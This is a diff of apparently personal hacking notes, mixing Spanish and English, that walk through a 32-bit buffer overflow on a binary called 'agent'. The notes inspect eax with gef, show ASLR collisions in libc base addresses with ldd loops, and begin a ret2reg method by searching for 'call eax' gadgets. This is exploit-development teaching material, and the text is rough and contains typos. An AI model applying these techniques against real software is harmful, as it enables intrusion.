@@ -2139,7 +2139,9 @@ $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
 gef➤  
 ```
 
-So, as we can see it's correct, and we can even represent it graphically to make it clearer. The idea is that eax contains our A's and C now holds the stack, we already know where everything is located.
+So, as we can see it's correct, and we can even represent it graphically to make it clearer. The idea is that eax contains our A's because that direction seems that did change when we add input 
+
+and C now holds the stack, we already know where everything is located.
 
 
 $eax   : 0xffffd344  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
@@ -2166,9 +2168,137 @@ When ASLR is enabled, the memory layout of a program is randomized each time it 
 
 This presents a challenge for attackers, because they must now find the location of key areas of memory through trial and error, rather than simply exploiting a predictable memory layout. However, ASLR is not foolproof, and there are still techniques that attackers can use to bypass it, such as brute-force attacks or information leaks.
 
-Overall, ASLR is an important security feature that helps make it more difficult for attackers to exploit vulnerabilities in a program. nevertheless here in this example we will destroy it and instead of making us difficult to explote ASLR we will take advantage if it 
+Overall, ASLR is an important security feature that helps make it more difficult for attackers to exploit vulnerabilities in a program. nevertheless here in this example we will destroy it and instead of making us difficult to explote ASLR we will take advantage of it 
 
-le't me explain you how 
+le't me explain you how we will take advantage of it 
+
+first in the last example we saw that eax direction did not change too much and the ASLR is activated 
+
+let's verify vamos a buscar colisiones esto con el fin de hacer un retret
+
+primero que todo debemos tener en cuenta que Eax equivale a 32 bits entonces si yo le pregunto a gef por una cadena del 1 al 32 de eax es valido ya que eax tiene un valor de 32 bits basicamente en este ejemplo
+hariamos un cat y el output pues seria el de eax asi de facil pero para que sepas aqui en gdb uno puede ver mas registros supongamos que queremos ver lo hay -4 espacios de eax o sea le hariamos un cat a eax menos 4 entonces como en esta caso usamos gbd en lugar de cat le podemos decir  x/32 $eax-4 enntonces me mostrara un output menos 4 espacios antes del eax 
+
+entonces si yo busco por x32$eax entonces le estoy diciendo ponme todo eax para verificar donde se estan almacenando lo valores recordemos que si encontramos algo como \x41 es A y 
+```bash 
+y como sabemos \x41 es A 
+y como sabemos \x42 es B 
+y como sabemos \x43 es C 
+```
+entonces si vemos un output asi ya sabriamos identificarlo 
+
+y mira hablando de eso, encontramos A's
+```bash 
+gef➤  x/32 $eax
+0xffffd344:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd354:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd364:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd374:	0x41414141	0x41414141	0x41414141	0x41414141
+```
+si retrosedo -4 espacios usando eax como referencia entonces podriamos ver otros registros 
+```bash
+gef➤  x/16 $eax-4
+0xffffd340:	0x804b02c	0x41414141	0x41414141	0x41414141
+0xffffd350:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd360:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141
+```
+esto es solo para mostrarte a mas detalle donde se almacenan los registros no te me confundas ahora vamos a ver como solucionamos la aleatorizacion
+entonces la idea es 
+
+ldd agent
+
+le podrias hacer un ldd para ver las librerias compartidas y vemos 
+
+y si luego filtrasmos con grep con libc 
+
+y luego filtramos con awk para quedarnos con el ultimo argumento de el output y luego le borras los parentisis o sea 
+
+ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'
+
+while true; do ldd agent  | grep libc; done | grep " "
+
+pero si luego verificamos el ASLR como trabaja
+haciendo una secuencia del 1 al 19
+
+for i in $(seq 1 19); do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
+output 
+
+```bash
+❯ for i in $(seq 1 19); do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
+0xf7d2c000
+0xf7da1000
+0xf7dc0000
+0xf7d00000
+0xf7d63000
+0xf7d8b000
+0xf7d95000
+0xf7cf6000
+0xf7d86000
+0xf7cf5000
+0xf7d60000
+0xf7d86000
+0xf7d04000
+0xf7d96000
+0xf7d2e000
+0xf7d8b000
+0xf7d81000
+0xf7cc4000
+0xf7d7e000
+```
+aqui podemos ver que a causa del ASLR la memoria cambia pues si agarramos cualquier valor del output que nos dio ese filtro podemos volver a filtrar usando ese output que seleccionamos yo voy a agarrar el primero 
+o sea este ```0xf7d2c000```
+
+while true; do ldd agent | grep libc; done | grep "0xf7d2c000"
+
+y como vemos hay colisiones 
+
+```bash
+❯ while true; do ldd agent | grep libc; done | grep "0xf7d2c000"
+	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
+	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
+	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
+	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
+	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
+	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
+	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
+	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
+	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
+	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
+```
+hay colisiones ya que hay veces que la memoria vale lo mismo 
+
+pero ese ataque se llama BOF [ret2libc](https://zeekk3n.github.io/andrey.github.io/.hacking-notes) 
+
+aqui vamos a explotar el ret2reg 
+
+aunque si falla simplemente podriamos hacer un re2libc que es el bufferoverflow + un ataque de fuerza bruta como vimos que hay colisiones en la memoria o sea hay veces que la memoria repite, entonces podriamos de aprovecharnos de eso enviando la solicitud del bufferoverflow tantas veces que alguna de ellas va a calzar con la colicion de la memoria 
+
+si a ti te falla aqui esta bien explicado [ret2libc](https://zeekk3n.github.io/andrey.github.io/.hacking-notes) esto lo hice para tener varias opciones en caso de que veamos un bof pero esto pasa porque el binario es de 32 bits verdad si tu tienes un binario que no sea de 32 bits cambia la cosa 
+porque esta contenido dentro del binario el eax ret2reg
+
+bueno como dije vamos a explotar un ret2reg que en resumen es como hay aleatorizacion en la memoria nosotros tendriamos que apuntar a un lugar donde no cambie entonces 
+
+```bash
+with /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm >  
+```
+
+output 
+```bash 
+nasm > call eax
+00000000  FFD0              call eax
+nasm > 
+```
+
+now with object dump we will 
+
+
+with objdump 
+```bash 
+objt dump -D agent | grep "FF D0" -i
+```
+
 
 
 
